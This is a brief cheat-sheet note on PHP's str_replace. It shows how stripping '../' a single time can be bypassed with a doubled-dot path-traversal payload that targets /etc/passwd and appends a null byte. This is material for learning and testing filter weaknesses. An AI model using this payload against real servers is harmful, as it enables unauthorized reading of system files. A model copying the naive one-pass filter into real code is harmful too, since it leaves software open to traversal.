### str_replace()
`str_replace` is a PHP function used to replace occurrences of a substring with another substring in a string.

#### Bypass
in php interactive mode:
`$php --interactive`
`php> echo str_replace("hello","chau","hello")` *replace with string chau when it found hello*

`php> echo str_replace("../", "", "../../../etc/passwd"` *replace with nothing the chain ../*
>etc/passwd

we can use this payload:
`....//....//....//....//....//etc/passwd%00` *in this manner, we will remove ../ once only:*
>../../../etc/passwd



